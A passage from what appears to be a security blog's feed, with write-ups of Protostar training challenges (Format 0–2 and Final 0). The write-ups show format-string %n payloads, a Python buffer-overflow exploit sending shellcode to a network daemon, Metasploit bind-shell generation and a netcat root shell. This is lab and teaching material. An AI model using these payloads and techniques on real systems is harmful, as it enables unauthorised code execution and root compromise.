AAAA200b7fd8420bffff62441414141
target is 0 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we&amp;rsquo;re getting to a pretty good point, let&amp;rsquo;s go ahead and find the memory address for &amp;ldquo;target&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, let&amp;rsquo;s put that address in, replacing the &amp;ldquo;AAAA&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%x%x%x%x&amp;quot;&#39;` | ./format2
200b7fd8420bffff62480496e4
target is 0 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The address seems to be the last word, without any problems.  So if we convert the last &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%n&amp;rdquo;, it should overwrite that address in memory with the count of characters printed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%x%x%x%n&amp;quot;&#39;` | ./format2
200b7fd8420bffff624
target is 23 :(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Unfortunately, only 23 characters were written.  We can increase that number artificially by just changing the format string from &amp;ldquo;%x&amp;rdquo; to &amp;ldquo;%44x&amp;rdquo;.  This pads the string to be 44 characters long:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%44x%x%x%n&amp;quot;&#39;` | ./format2
                                         200b7fd8420bffff624
you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s pretty much how it&amp;rsquo;s done.&lt;/p&gt;

&lt;p&gt;And again, as bonus, if you want to use Direct Argument Access, you can simply do:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ echo `perl -e &#39;print &amp;quot;\xe4\x96\x04\x08%7\\\$60x%4\\\$n&amp;quot;&#39;` | ./format2
                                                       a6e24
you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 1</title>
      <link>http://test.andreko.net/2012/01/30/exploit-exercises---protostar-format-1/</link>
      <pubDate>Mon, 30 Jan 2012 18:12:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/01/30/exploit-exercises---protostar-format-1/</guid>
      <description>&lt;p&gt;Following the Format 0 challenge, I&amp;rsquo;ve had to do a bunch of reading on how format string exploits work on a very low level.&lt;/p&gt;

&lt;p&gt;Some resources that I&amp;rsquo;ve found greatly useful:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://www.amazon.com/gp/product/1593271441/ref=as_li_ss_tl?ie=UTF8&amp;amp;tag=mattandcom-20&amp;amp;linkCode=as2&amp;amp;camp=1789&amp;amp;creative=390957&amp;amp;creativeASIN=1593271441&#34;&gt;Hacking: The Art of Exploitation, 2nd Edition&lt;/a&gt;&lt;img src=&#34;http://www.assoc-amazon.com/e/ir?t=mattandcom-20&amp;l=as2&amp;o=1&amp;a=1593271441&#34; width=&#34;1&#34; height=&#34;1&#34; border=&#34;0&#34; alt=&#34;&#34; style=&#34;border:none !important; margin:0px !important;&#34; /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf&#34;&gt;Exploiting Format String Vulnerabilities&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.securitytube.net/groups?operation=view&amp;amp;groupId=3&#34;&gt;SecurityTube.net Format String Vulnerabilities Megaprimer&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With this challenge, we&amp;rsquo;re given some c code in which we are to find the vulnerability.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int target;

void vuln(char *string)
{
 printf(string);

 if(target) {
  printf(&amp;quot;you have modified the target :)\n&amp;quot;);
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you notice, there is a string format vulnerability inside the &amp;ldquo;vuln&amp;rdquo; function.  It is doing a &amp;ldquo;printf&amp;rdquo; of a string directly provided by the user.  To prevent this vulnerability, this line should read:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf(&amp;quot;%s&amp;quot;, string);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The first step of exploiting this vulnerability, would be to find the address of &amp;ldquo;target&amp;rdquo;, so that we can modify it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next step, is to find the direct reference in the stack to the command argument we enter.  To do this, we can simply spam &amp;ldquo;%x&amp;rdquo;, since that pops the next word off of the stack.  If we do it multiple times, eventually we&amp;rsquo;ll get to where the argument is located.  I chose to do it 150 times, guessing it would be less than that.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 AAAAAAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x150&#39;`
AAAAAAAA804960c.bffff628.8048469.b7fd8304.b7fd7ff4.bffff628.8048435.bffff7f0.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6a8.b7eadc76.2.bffff6d4.bffff6e0.b7fe1848.bffff690.ffffffff.b7ffeff4.804824d.1.bffff690.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6a8.8570f76f.af24e17f.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6d4.8048450.8048440.b7ff1040.bffff6cc.b7fff8f8.2.bffff7e6.bffff7f0.0.bffff9bb.bffff9c6.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff17.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7cb.1f.bffffff2.f.bffff7db.0.0.0.cf000000.4b112951.96083d4e.8dce3d07.69b25f71.363836.0.2f2e0000.6d726f66.317461.41414141.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If you look at that output, you&amp;rsquo;ll see each byte in the stack, separated by periods.  Eventually, you should see &amp;ldquo;41414141&amp;rdquo;, since the 150 number was enough.  This points to the &amp;ldquo;AAAAAAAA&amp;rdquo; we entered at the beginning of the argument.  I often find it easy to do 8 &amp;ldquo;A&amp;rdquo;s instead of 4, in case the byte is split up, and not aligned properly, giving something like &amp;ldquo;41411234.5678414141&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;Counting in, it looks like it was 128 bytes into the stack to get to.  Just to verify, let&amp;rsquo;s try a little more precisely:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 AAAA`perl -e &#39;print &amp;quot;%x.&amp;quot;x128&#39;`%x
AAAA804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff834.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.77ba880e.5dee1e1e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff82a.bffff834.0.bffff9bb.bffff9c6.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff17.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.3b000000.34e9adc8.e1b8c42b.3212319e.690884e6.363836.0.0.2f2e0000.6d726f66.317461.41414141
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That verifies that no additional padding needs to be done, the last word is reading perfectly.&lt;/p&gt;

&lt;p&gt;Next, instead of passing &amp;ldquo;AAAA&amp;rdquo; (or 0x41414141) as the address, we&amp;rsquo;ll try using the address of &amp;ldquo;target&amp;rdquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `perl -e &#39;print &amp;quot;\x38\x96\x04\x08&amp;quot; . &amp;quot;%x.&amp;quot;x128&#39;`%x
8804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff834.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.b623f0ae.9c7766be.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff82a.bffff834.0.bffff9bb.bffff9c6.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff17.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.98000000.88091ce4.7be8a4e7.30f01468.69a9fa50.363836.0.0.2f2e0000.6d726f66.317461.8049638
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that the initial 0 is missing, but that&amp;rsquo;s ok.  It seems that worked as well, so let&amp;rsquo;s tell it to overwrite the memory address instead of just printing it to the screen:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `perl -e &#39;print &amp;quot;\x38\x96\x04\x08&amp;quot; . &amp;quot;%x.&amp;quot;x128&#39;`%n
8804960c.bffff668.8048469.b7fd8304.b7fd7ff4.bffff668.8048435.bffff834.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6e8.b7eadc76.2.bffff714.bffff720.b7fe1848.bffff6d0.ffffffff.b7ffeff4.804824d.1.bffff6d0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6e8.a61b35ff.8c4fa3ef.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff714.8048450.8048440.b7ff1040.bffff70c.b7fff8f8.2.bffff82a.bffff834.0.bffff9bb.bffff9c6.bffff9d6.bffff9f6.bffffa09.bffffa13.bfffff03.bfffff17.bfffff55.bfffff6c.bfffff7d.bfffff85.bfffff95.bfffffa2.bfffffd4.bfffffe0.0.20.b7fe2414.21.b7fe2000.10.febfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff80b.1f.bffffff2.f.bffff81b.0.0.0.48000000.eacde3e8.ce402cfb.689377d6.699e12c7.363836.0.0.2f2e0000.6d726f66.317461.you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it.  We modified the value, which made the application output &amp;ldquo;you have modified the target :)&amp;rdquo;&lt;/p&gt;

&lt;p&gt;As a bonus solution, I found you can also use Direct Parameter Access, and solve it with a lot less junk on the screen:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format1 `perl -e &#39;print &amp;quot;\x38\x96\x04\x08&amp;quot;&#39;`%128\$n
8you have modified the target :)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Format 0</title>
      <link>http://test.andreko.net/2012/01/24/exploit-exercises---protostar-format-0/</link>
      <pubDate>Tue, 24 Jan 2012 05:13:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/01/24/exploit-exercises---protostar-format-0/</guid>
      <description>&lt;p&gt;I&amp;rsquo;ll be honest, I&amp;rsquo;m new to format string exploits.  I&amp;rsquo;ve been more experienced with stack overflows, and a little with heap overflows.  So hopefully this information is correct, as it&amp;rsquo;s from my current understanding.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;&lt;a href=&#34;http://exploit-exercises.com/protostar/format0&#34;&gt;Protostar Format 0&lt;/a&gt; starts us off with the following vulnerable code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void vuln(char *string)
{
 volatile int target;
 char buffer[64];

 target = 0;

 sprintf(buffer, string);

 if(target == 0xdeadbeef) {
  printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;);
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at this code, somehow we have to get the variable, &amp;ldquo;target&amp;rdquo;, which is never set anywhere other than to &amp;ldquo;0&amp;rdquo;, to equal &amp;ldquo;0xdeadbeef&amp;rdquo;.  Luckily, the &amp;ldquo;target&amp;rdquo; variable is on the stack, right before the &amp;ldquo;buffer&amp;rdquo; variable.  That means, if we can overflow &amp;ldquo;buffer&amp;rdquo;, it&amp;rsquo;ll leak out into &amp;ldquo;target&amp;rdquo;. I decided for my understanding, that I would modify the c source file a little, so I could see what was going on better.  I added in 3 additional printf statements.  (This is mainly because I wasn&amp;rsquo;t smart enough to get gdb to tell me where &amp;ldquo;buffer&amp;rdquo; and &amp;ldquo;target&amp;rdquo; were in memory.)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

void vuln(char *string)
{
        volatile int target;
        char buffer[64];

        target = 0;

        sprintf(buffer, string);

        printf(&amp;quot;Target: %08x\n&amp;quot;, target);
        printf(&amp;quot;Address of target: %08x\n&amp;quot;, &amp;amp;target);
        printf(&amp;quot;Address of buffer: %08x\n&amp;quot;, &amp;amp;buffer);

        if(target == 0xdeadbeef) {
                printf(&amp;quot;you have hit the target correctly :)\n&amp;quot;);
        }
}

int main(int argc, char **argv)
{
        vuln(argv[1]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, when I execute my custom compiled version, it gives me useful information:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ ./format0_1
Target: 00000000
Address of target: bffff7bc
Address of buffer: bffff77c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just to verify that there was no spacing after &amp;ldquo;buffer&amp;rdquo; and before &amp;ldquo;target&amp;rdquo;, I took those 2 values, and did some math:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:~$ perl -e &#39;print 0xbffff7bc-0xbffff77c . &amp;quot;\n&amp;quot;&#39;
64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Initially, I thought this looked a lot like a stack overflow, especially since it did work as one:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 `perl -e &#39;print &amp;quot;A&amp;quot;x64 . &amp;quot;\xef\xbe\xad\xde&amp;quot;&#39;`
you have hit the target correctly :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is cheating though, since this is to demonstrate format string exploitation, and the &lt;a href=&#34;http://exploit-exercises.com/protostar/format0&#34;&gt;Format 0&lt;/a&gt; page says specifically:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;This level should be done in less than 10 bytes of input.&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So grumbling that I was going to have to do extra work, I started reading about string format exploitation.  A great document was titled &lt;a href=&#34;http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf&#34;&gt;&amp;ldquo;Exploiting Format String Vulnerabilities&amp;rdquo;&lt;/a&gt;, by scut / team teso&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;It was in this document, that I found that you can actually tell the c compiler to read a certain number of bytes into a format.  I had seen this done half a dozen times before, but never knew that&amp;rsquo;s what it was doing.  For example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;printf(&amp;quot;Target: %08x\n&amp;quot;, target);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Normally for a hex formatting, you would simply use &amp;ldquo;%x&amp;rdquo; as the placeholder.  Well, apparently if you use &amp;ldquo;%08x&amp;rdquo;, it will format it with 8 hex characters.  This is so that when &amp;ldquo;target&amp;rdquo; is set to 0, it actually prints &amp;ldquo;0x00000000&amp;rdquo; instead of &amp;ldquo;0x0&amp;rdquo;.  Very nice!&lt;/p&gt;

&lt;p&gt;The same works for other types, such as decimal (&amp;ldquo;%d&amp;rdquo;).  Since in the c program, it&amp;rsquo;s doing:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sprintf(buffer, string);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this code, &amp;ldquo;string&amp;rdquo; is the first argument you pass to the program.  Since sprintf won&amp;rsquo;t stop until it reads a null byte (as in a null terminated string), I just formatted it to read 64 bytes, and then concatenated &amp;ldquo;deadbeef&amp;rdquo; in little endian to it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 `perl -e &#39;print &amp;quot;%64d&amp;quot; . &amp;quot;\xef\xbe\xad\xde&amp;quot;&#39;`
you have hit the target correctly :)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You could also format it with the &amp;ldquo;%64d&amp;rdquo; not in the perl statement, but I don&amp;rsquo;t think it looks as readable.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;user@protostar:/opt/protostar/bin$ ./format0 %64x`perl -e &#39;print &amp;quot;\xef\xbe\xad\xde&amp;quot;&#39;`
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So there you have it.  That&amp;rsquo;s definitely under 10 bytes of input.  I still have room for 2 more bytes if I need.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Final 0</title>
      <link>http://test.andreko.net/2012/01/22/exploit-exercises---protostar-final-0/</link>
      <pubDate>Sun, 22 Jan 2012 22:08:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/01/22/exploit-exercises---protostar-final-0/</guid>
      <description>

&lt;p&gt;I for some reason decided to look at the set of &amp;ldquo;final&amp;rdquo; challenges, and found the &lt;a href=&#34;http://exploit-exercises.com/protostar/final0&#34;&gt;first one&lt;/a&gt; to be not too difficult.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We start with the following code being given to us:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;

#define NAME &amp;quot;final0&amp;quot;
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
 char buffer[512];
 char *q;
 int i;

 memset(buffer, 0, sizeof(buffer));
 gets(buffer);

 /* Strip off trailing new line characters */
 q = strchr(buffer, &#39;\n&#39;);
 if(q) *q = 0;
 q = strchr(buffer, &#39;\r&#39;);
 if(q) *q = 0;

 /* Convert to lower case */
 for(i = 0; i &amp;amp;lt; strlen(buffer); i++) {
  buffer[i] = toupper(buffer[i]);
 }

 /* Duplicate the string and return it */
 return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
 int fd;
 char *username;

 /* Run the process as a daemon */
 background_process(NAME, UID, GID); 

 /* Wait for socket activity and return */
 fd = serve_forever(PORT);

 /* Set the client socket to STDIN, STDOUT, and STDERR */
 set_io(fd);

 username = get_username();

 printf(&amp;quot;No such user %s\n&amp;quot;, username);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is a somewhat standard buffer overflow.  The buffer is 512 bytes long, but safe checks aren&amp;rsquo;t done to make sure it doesn&amp;rsquo;t go past that size.  I tried using the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&amp;rsquo;s&lt;/a&gt; pattern_create.rb, however, due to the fact that the buffer is having a &amp;ldquo;toupper()&amp;rdquo; done on it, it won&amp;rsquo;t find it.  I had to do it manually, by just splitting an array into &amp;ldquo;a&amp;rdquo; and &amp;ldquo;b&amp;rdquo; segments, and adjusting the sizes each time.  I found that the offset was at 532 bytes with the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect((&amp;quot;localhost&amp;quot;, 2995))

s.send(&amp;quot;a&amp;quot;*532 + &amp;quot;b&amp;quot;*8)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I ran it, I was able to verify that I was correct.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# ./532.py 
root@protostar:/home/user# gdb --quiet --core=/tmp/core.11.final0.14765 
Core was generated by `/opt/protostar/bin/final0&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x62626262 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, I had to inject shellcode into the buffer, and find the address to return to.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(gdb) x/10s $esp-550
0xbffffaaa:  &amp;quot;&amp;quot;
0xbffffaab:  &amp;quot;&amp;quot;
0xbffffaac:  &amp;quot;\211\005&amp;quot;
0xbffffaaf:  &amp;quot;&amp;quot;
0xbffffab0:  &amp;quot;\224\310\351\267\020ii\r&amp;quot;, &#39;A&#39; &amp;lt;repeats 192 times&amp;gt;...
0xbffffb78:  &#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...
0xbffffc40:  &#39;A&#39; &amp;lt;repeats 120 times&amp;gt;
0xbffffcb9:  &amp;quot;&amp;quot;
0xbffffcba:  &amp;quot;&amp;quot;
0xbffffcbb:  &amp;quot;&amp;quot;
(gdb) x/10s 0xbffffab0+8
0xbffffab8:  &#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...
0xbffffb80:  &#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...
0xbffffc48:  &#39;A&#39; &amp;lt;repeats 112 times&amp;gt;
0xbffffcb9:  &amp;quot;&amp;quot;
0xbffffcba:  &amp;quot;&amp;quot;
0xbffffcbb:  &amp;quot;&amp;quot;
0xbffffcbc:  &amp;quot;&amp;quot;
0xbffffcbd:  &amp;quot;\002&amp;quot;
0xbffffcbf:  &amp;quot;&amp;quot;
0xbffffcc0:  &#39;a&#39; &amp;lt;repeats 12 times&amp;gt;, &amp;quot;bbbbbbbb&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From this, we can see that the final buffer, after the &amp;ldquo;toupper()&amp;rdquo; and &amp;ldquo;strdup()&amp;rdquo; is located at 0xbffffab8.  We now have the option of putting the shellcode before or after the return address.&lt;/p&gt;

&lt;h2 id=&#34;before&#34;&gt;Before&lt;/h2&gt;

&lt;p&gt;I setup a quick python script to use the offset of 532 bytes, added a little bit of a nop sled and shellcode.  Since the code uses a &amp;ldquo;toupper()&amp;rdquo;, the shellcode can&amp;rsquo;t contain any lowercase letters.  I luckily was able to find some shellcode that suits this scenario perfectly &lt;a href=&#34;http://www.exploit-db.com/exploits/13427&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect((&amp;quot;localhost&amp;quot;, 2995))

offset = 532

ret = &amp;quot;\xEF\xBE\xAD\xDE&amp;quot;
nop = &amp;quot;\x90&amp;quot;*16

shellcode = &amp;quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff&amp;quot; \
&amp;quot;\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47&amp;quot; \
&amp;quot;\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed&amp;quot; \
&amp;quot;DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB&amp;quot; \
&amp;quot;AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA&amp;quot; \
&amp;quot;JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO&amp;quot; \
&amp;quot;BLAALMNIA&amp;quot;

junk = &amp;quot;a&amp;quot;*(offset-len(nop)-len(shellcode))

s.send(nop + shellcode + junk + ret)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After running that script, I was able to debug the dump file. This allowed me to get the address to return to, containing the nop sled and shellcode.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# gdb --quiet --core=/tmp/core.11.final0.14816 
Core was generated by `/opt/protostar/bin/final0&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0xdeadbeef in ?? ()
(gdb) x/10x 0xbffffabf
0xbffffabf: 0x90909090 0x90909090 0xeb02eb90 0xfff9e805
0xbffffacf: 0x815fffff 0xffffdfef 0x295e57ff 0xb8c180c9
0xbffffadf: 0x412c078a 0x4704e0c0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Given this information, it should be pretty safe to use 0xbffffabf as a return address.  The final script would be:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/python

from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect((&amp;quot;localhost&amp;quot;, 2995))

offset = 532
ret = &amp;quot;\xbf\xfa\xff\xbf&amp;quot; #0xbffffabf

nop = &amp;quot;\x90&amp;quot;*16

#http://www.exploit-db.com/exploits/13427/
shellcode = &amp;quot;\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5f\x81\xef\xdf\xff\xff\xff&amp;quot; \
&amp;quot;\x57\x5e\x29\xc9\x80\xc1\xb8\x8a\x07\x2c\x41\xc0\xe0\x04\x47&amp;quot; \
&amp;quot;\x02\x07\x2c\x41\x88\x06\x46\x47\x49\xe2\xed&amp;quot; \
&amp;quot;DBMAFAEAIJMDFAEAFAIJOBLAGGMNIADBNCFCGGGIBDNCEDGGFDIJOBGKB&amp;quot; \
&amp;quot;AFBFAIJOBLAGGMNIAEAIJEECEAEEDEDLAGGMNIAIDMEAMFCFCEDLAGGMNIA&amp;quot; \
&amp;quot;JDIJNBLADPMNIAEBIAPJADHFPGFCGIGOCPHDGIGICPCPGCGJIJODFCFDIJO&amp;quot; \
&amp;quot;BLAALMNIA&amp;quot;

junk = &amp;quot;a&amp;quot;*(offset-len(nop)-len(shellcode))

s.send(nop + shellcode + junk + ret)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then ran this script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# ./final0_before.py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The shellcode said that it would bind a shell to port 5074, so I used netcat to connect.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@protostar:/home/user# nc localhost 5074
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s root access from the network.  Challenge complete.&lt;/p&gt;

&lt;h2 id=&#34;after&#34;&gt;After&lt;/h2&gt;

&lt;p&gt;When putting the shellcode after the return address, we don&amp;rsquo;t have to worry about the &amp;ldquo;toupper()&amp;rdquo; function.  I simply used the &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit Framework&amp;rsquo;s&lt;/a&gt; msfpayload and msfencode functions to generate a basic bind shell.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfpayload linux/x86/shell_bind_tcp R | msfencode -b &#39;\x00\xff\x0d\x0a&#39; -e x86/shikata_ga_nai -t c
[*] x86/shikata_ga_nai succeeded with size 105 (iteration=1)

unsigned char buf[] = 
&amp;quot;\xdb\xce\xd9\x74\x24\xf4\xbb\xa3\xc2\x12\x69\x58\x2b\xc9\xb1&amp;quot;
&amp;quot;\x14\x31\x58\x19\x03\x58\x19\x83\xe8\xfc\x41\x37\x23\xb2\x72&amp;quot;
&amp;quot;\x5b\x17\x07\x2f\xf6\x9a\x0e\x2e\xb6\xfd\xdd\x30\xec\x5f\x8c&amp;quot;
